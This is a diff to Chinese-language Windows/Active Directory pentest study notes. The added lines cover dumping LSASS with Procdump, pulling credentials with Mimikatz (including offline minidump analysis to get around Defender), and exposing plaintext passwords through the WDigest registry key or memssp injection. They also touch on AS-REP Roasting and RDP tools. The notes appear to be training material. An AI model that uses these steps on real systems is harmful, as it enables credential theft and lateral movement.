@@ -312,18 +312,54 @@ $ file [filename]
                 $ hashcat -a 0 -m 1000 ntlm.hash rockyou.txt --force
                 ```
     * Password Spraying(用猜的)用一組密碼去爆所有的帳號
-    * GPO
     * 記憶體(lsass): 透過Mimikatz取得Local Admin的NTLM
-        
-        以系統管理員啟動mimikatz
-        ```bash
-        $ Privilege::Debug
-        Privilege '20' OK
-        $ log
-        Using 'mimikatz.log' for logfile : OK
-        $ Sekurlsa::logonPasswords
-        ```
+        1. 把lsass dump下來
+            * 找到Local Security Authority Process(LSASS)，右鍵選**建立傾印檔案**，就可以直接dump memory
+            * 直接使用[Procdump](https://docs.microsoft.com/zh-tw/sysinternals/downloads/procdump)，當然你必須要取得足夠的權限
+                ```bash
+                $ procdump.exe -accepteula -ma lsass.exe lsass.dmp > c:\\tmp.txt
+                ```
+        2. 分析lsass
+            * 以系統管理員啟動mimikatz
+                ```bash
+                $ Privilege::Debug
+                Privilege '20' OK
+                $ log
+                Using 'mimikatz.log' for logfile : OK
+                $ Sekurlsa::logonPasswords
+                ```
+            * 如果Mimikatz不能用，或是直接被defender刪除，可以把檔案丟到自己的電腦用mimikatz分析，或者是透過Minidump獲取資訊
+                ```bash
+                $ Sekurlsa::minidump "<path to lsass.dmp>"
+                Switch to MINIDUMP : '<path to lsass.dmp>'
+                $ Sekurlsa::logonPasswords
+                ```
+        * 顯示Mimikatz的明文
+            * 有辦法重開機
+                1. 只要打開regedit，在`電腦\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest`可能會看到`UseLogonCredential`的名稱，只要把對應的數值改成1就可以了，當然如果沒看到的話也可以自己新增
+                2. 重開機: 重開機前可以先把之前mimikatz的結果存起來，照樣之後可以對照著看
+            * 沒有辦法重開機
+                1. Inject memssp: 用系統管理員權限開mimikatz
+                    ```bash
+                    $ privilege::debug
+                    $ misc::memssp
+                    Injected =)
+                    ```
+                2. Relogin: 重新登出再登入才會看到
+                3. 在`C:\Windows\System32\mimilsa.log`可以看到用明文的方式新增了密碼
 
+    * AS-REP Roasting: 是一種針對 Kerberos authentication 的攻擊技術，用來 離線破解使用者密碼，而且通常 不需要先登入任何帳號，可以直接看[NTUSTISC - AD Note - Lab(0x21 AS-REP Roasting)]({{base.url}}/NTUSTISC-AD-Note-Lab(0x21AS-REP-Roasting)/)的教學
+
+#### RDP
+* Linux / Kali
+    * xfreerdp
+        ```bash
+        $ sudo apt install freerdp2-x11 -y
+        ```
+    * [Libfreerdp](https://packages.debian.org/sid/libfreerdp-client2-2)
+* Windows
+    * Psexec.exe
+    
 #### Wireless Related
 * 大部分都會用到[Aircrack](https://sectools.tw/aircrack-ng-%E6%95%99%E5%AD%B8/)這個工具
 * Deauthentication - [airodump-ng教學](http://atic-tw.blogspot.com/2014/01/airodump-ng.html) / [aireplay-ng教學](http://atic-tw.blogspot.com/2014/01/aireplay-ng6.html)
